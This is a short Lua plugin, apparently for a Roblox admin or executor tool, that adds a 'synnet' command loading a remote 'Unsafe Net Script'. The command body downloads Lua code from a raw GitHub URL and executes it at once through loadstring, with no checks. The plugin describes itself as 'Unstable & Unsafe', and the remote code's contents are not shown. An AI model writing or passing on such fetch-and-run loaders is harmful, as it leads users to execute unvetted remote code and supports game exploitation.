local Plugin = {
	["PluginName"] = "Syn Net",
	["PluginDescription"] = "Unstable & Unsafe",
	["Commands"] = {
		["synnet"] = {
			["ListName"] = "synnet",
			["Description"] = "Load Synttax's Unsafe Net Script",
			["Aliases"] = {},
			["Function"] = function(args, speaker)
				 loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/daximul/who/main/a/test/what/others/cl_net.lua"))();
			end,
		},
	},
}
return Plugin
